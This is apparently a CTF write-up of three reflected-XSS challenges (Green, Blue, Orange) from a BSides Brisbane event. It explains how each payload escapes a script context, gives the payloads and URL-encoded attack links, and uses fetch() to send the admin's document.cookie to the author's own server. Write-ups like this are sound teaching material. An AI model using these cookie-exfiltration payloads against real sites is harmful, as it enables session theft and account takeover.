      <p>Can you leak the admin‚Äôs cookies?</p> 
      <p>Author: mnz</p> 
     </blockquote> 
     <p>We‚Äôre presented with a bright green home page with a single link pointing to a form which we can use to send links to the admin for review. If we send a link to a site we control, we could run arbitrary JavaScript in the admin‚Äôs browser, however, we wouldn‚Äôt be able to access the cookie. Clearly, we need to find an XSS, and given that the site has such a small surface, it shouldn‚Äôt be too hard. But I looked around for 15 minutes or so and didn‚Äôt find anything. I knew that I must be missing something.</p> 
     <p>Later on, Howard let me know that they had found an XSS and just couldn‚Äôt figure out how to exploit it. It turns out, the XSS was pretty contrived and I just didn‚Äôt see it because I was using Safari with the compact tab layout (which only displays the domain of a site unless you click on the URL input to see the full URL). The XSS primitive was a <code>js</code> query parameter which gets reflected into the site ü§¶‚Äç‚ôÇÔ∏èUsually I use Firefox for CTF challenges but I didn‚Äôt bother because it was supposedly a simple web challenge. Lesson learnt!</p> 
     <p>When you visit the homepage without the <code>js</code> parameter, you get redirected to this URL: <code>https://green.web.ctf.bsidesbne.com/?js=your_input_here</code>. A quick inspect element reveals that we‚Äôve been given a reflected XSS (but not quite for free).</p> 
     <pre><code class="language-html">&lt;html&gt;
  &lt;script&gt;
    function deadcode(){
      /*your_input_here */
    }
  &lt;/script&gt;
  &lt;body style="background: lightgreen"&gt;
    &lt;h1&gt;Green&lt;/h1&gt;
    &lt;hr /&gt;
    &lt;a href="report.php"&gt;send link to admin&lt;/a&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre> 
     <p>Figure 1: <em>the source of the page, notice that the value of the <code>js</code> parameter included verbatim in the script tags.</em></p> 
     <p>To exploit this vulnerability we need to find an input that will allow us to escape the comment, escape the function, and then insert code that will send the admin‚Äôs cookie back to us. We also need to ensure that the code after our input doesn‚Äôt cause a syntax error, that is the closing brace of the function must be matched by an opening brace in our input.</p> 
     <pre><code class="language-js">*/}fetch("https://backend.stackotter.dev:8000/?"+document.cookie);{/*
</code></pre> 
     <p>Figure 2: <em>the payload I used to exfiltrate the admin‚Äôs cookie.</em></p> 
     <p>First, I escaped the comment and the function simply by closing them, then I used <code>fetch</code> to send the admin‚Äôs cookie to a server I control, then I used a <code>{</code> to ensure that the original closing brace was matched (it‚Äôll get parsed as an empty object), and finally I used a <code>/*</code> to ensure that the closing delimiter of the comment we escaped gets matched.</p> 
     <pre><code class="language-js">function deadcode(){
  /**/}fetch("https://backend.stackotter.dev:8000/?"+document.cookie);{/* */
}

// With some clean up, the code becomes a lot more clear.
function deadcode() {}
fetch("https://backend.stackotter.dev:8000/?"+document.cookie);
{}
</code></pre> 
     <p>Figure 3: <em>the payloaded inserted into the original script and cleaned up to demonstrate how it works.</em></p> 
     <p>Putting this payload through CyberChef‚Äôs <code>URL Encode</code> recipe with <code>Encode all special chars</code> enabled gives us the value to pass to <code>js</code> in the URL. Sending the following URL to the admin successfully got the admin‚Äôs cookie to turn up in the logs of the server I controlled; <a href="https://green.web.ctf.bsidesbne.com/?js=%2A%2F%7Dfetch%28%22https%3A%2F%2Fbackend%2Estackotter%2Edev%3A8000%2F%3F%22%2Bdocument%2Ecookie%29%3B%7B%2F%2A">https://green.web.ctf.bsidesbne.com/?js=%2A%2F%7Dfetch%28%22https%3A%2F%2Fbackend%2Estackotter%2Edev%3A8000%2F%3F%22%2Bdocument%2Ecookie%29%3B%7B%2F%2A</a></p>

     <p>Note that I had to use an <code>https</code> web server with my payload because of CORS, but it turns out that by using fetch‚Äôs <code>no-cors</code> mode to ignore CORS I could‚Äôve used a regular <code>http</code> server. Using <code>no-cors</code> restricts what parts of the request we can control and what parts of the response we can read, but that doesn‚Äôt matter in this case. Thanks OMGasm for pointing out this improvement after the CTF!</p> 
     <p>I have included the simple server code that I used, it really wasn‚Äôt anything fancy. If you don‚Äôt have a server available, I‚Äôve heard that you can also try <a href="https://ngrok.com">ngrok</a> for these kinds of challenges.</p>

      <p>Can you leak the admin‚Äôs cookies?</p> 
      <p>Author: mnz</p> 
     </blockquote> 
     <p>We‚Äôre basically presented with the exact same site as XSS Green, expect this time it‚Äôs blue! (and our input is injected into a slightly more annoying part of the script tag).</p> 
     <pre><code class="language-js">function deadcode() {
  var params = {};
  params['noot'] = "your_input_here";
  params['doot'] = 'your_input_here';
}
</code></pre> 
     <p>Figure 6: <em>the script that our input gets inserted into.</em></p> 
     <p>To approach this problem I started out with my working payload for XSS Green and started to modify it. Initially I aimed to just get the payload working for the second string while ignoring the first string. Then, since the two strings used different quotation marks I could modify the payload so that it was basically a bunch of benign code when inserted into the first string. It‚Äôs hard to explain the process I used as it was essentially just intuition, but the core idea is that by using the two types of quotes, the two insertion points will interpret different parts of the input as syntax highlighting will show you below.</p> 
     <pre><code class="language-js">";';} fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);{ //'//
</code></pre> 
     <p>Figure 7: <em>my payload for XSS Blue.</em></p> 
     <pre><code class="language-js">function deadcode() {
  var params = {};
  params['noot'] = "";';} fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);{ //'//";
  params['doot'] = '";';} fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);{ //'//';
}

// Cleaning the code up a little makes things a bit more clear
function deadcode() {
  var params = {};
  params['noot'] = "";
  ';} fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);{ //'
  params['doot'] = '";';
}
fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);
{}
</code></pre> 
     <p>Figure 8: <em>the script after having the payload inserted into it.</em></p> 
     <p>As you can see from the syntax highlighting, at the first insertion site our payload is basically just ignored as one big string followed by a comment. In contrast, the second one escapes the function, sends the cookie to our server, and matches the function‚Äôs original closing brace just as my payload for XSS Green did.</p> 
     <p>URL encoding the payload (from Figure 7) and passing that as the <code>js</code> query parameter of the URL we send to the admin gives us the flag; <a href="https://blue.web.ctf.bsidesbne.com/?js=%22%3B%27%3B%7D%20fetch%28%60https%3A%2F%2Fbackend.stackotter.dev%3A8000%2F%3F%60%2Bdocument.cookie%29%3B%7B%20%2F%2F%27%2F%2F">https://blue.web.ctf.bsidesbne.com/?js=%22%3B%27%3B%7D%20fetch%28%60https%3A%2F%2Fbackend.stackotter.dev%3A8000%2F%3F%60%2Bdocument.cookie%29%3B%7B%20%2F%2F%27%2F%2F</a></p>

      <p>Author: mnz</p> 
     </blockquote> 
     <p>Again this challenge was pretty similar to XSS Blue and XSS Green in nature, except this time the website was orange! (surprise)</p> 
     <p>The main twist this time was that there were now blocked keywords (such as <code>window</code> and <code>function</code>). Also, our input now gets put in 3 spots.</p> 
     <pre><code class="language-js">function deadcode(your_input_here) {
  if (your_input_here) {
    var params = {};
    params['noot'] = "your_input_here";
    return params;
  }
}
</code></pre> 
     <p>Figure 10: <em>the script that our input gets inserted into.</em></p> 
     <p>I‚Äôll try my best to explain the rough thought process I followed (as much of it as I can remember), but honestly these kinds of challenges are mostly just intuition with trial and error for me so it‚Äôs pretty hard to give solid advice on how to solve them.</p> 
     <p>The first thing to notice is that the third location (the double quoted string) is the odd one out and we can easily just ignore it by not using newlines or double quotes. This simplifies things a bit. Next, we can see that the biggest challenge is that the first insertion point has to end up looking like a function parameter list (which is quite a bit stricter than the if condition insertion point). Because of that observation, I started my payload with <code>x)</code> to make that valid and immediately escape it. Next I provided a function body that sends the cookie to our server, and after the function body I call <code>deadcode</code>. Now we just need to make sure that the payload cleanly matches up all of the closing delimiters of the things that it escaped. Because the <code>function</code> keyword is blocked we can‚Äôt simply use <code>function (</code> to match <code>) {</code>, but luckily we can just use a comment to ignore the <code>) {</code> immediately after our input and then use <code>() =&gt; {</code> to match the original closing brace of the function. We can‚Äôt just use <code>{</code> because there‚Äôs an if statement between the braces, which wouldn‚Äôt be valid as part of an object literal. With a few tweaks it‚Äôs not too difficult to ensure that the payload quietly works at the if statement insertion point too (it doesn‚Äôt actually get run so it just needs to be syntactically valid).</p> 
     <pre><code class="language-js">x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () =&gt; {//
</code></pre> 
     <p>Figure 11: <em>the final payload.</em></p> 
     <pre><code class="language-js">function deadcode(x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () =&gt; {//) {
  if (x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () =&gt; {//) {
    var params = {};
    params['noot'] = "x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () =&gt; {//";
    return params;
  }
}

// Cleaning the code up a little makes things a bit more clear
function deadcode(x) {
  fetch('https://backend.stackotter.dev:8000/?'+document.cookie)
};
deadcode();
var y = () =&gt; {
  if (x) {
    fetch('https://backend.stackotter.dev:8000/?'+document.cookie)
  };
  deadcode();
  var y = () =&gt; {
    var params = {};
    params['noot'] = "x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () =&gt; {//";
    return params;
  }
}
</code></pre> 
     <p>Figure 12: <em>the script after having the payload inserted into it.</em></p> 
     <p>Luckily JavaScript is very relaxed, because otherwise we might‚Äôve had to work a bit more to get this payload working üòÖ.</p>

     <h3 id="conclusion">Conclusion</h3> 
     <p>This challenge was pretty interesting to solve and was a nice follow on challenge from the previous two XSS challenges that I had solved. However, the fact that the web category had two of these lucrative ‚Äòchallenge series‚Äôs meant that the pwn challenges didn‚Äôt have much value in terms of points. I spent an hour-ish total to solve the three of the XSS challenges for 800 points, but spent multiple hours on <code>protec</code> (a pwn challenge that didn‚Äôt get a second solve right until the end) for just 350 points. The CTF devs did a great job with the CTF, but I think the scoring could do with some tuning next year.</p>
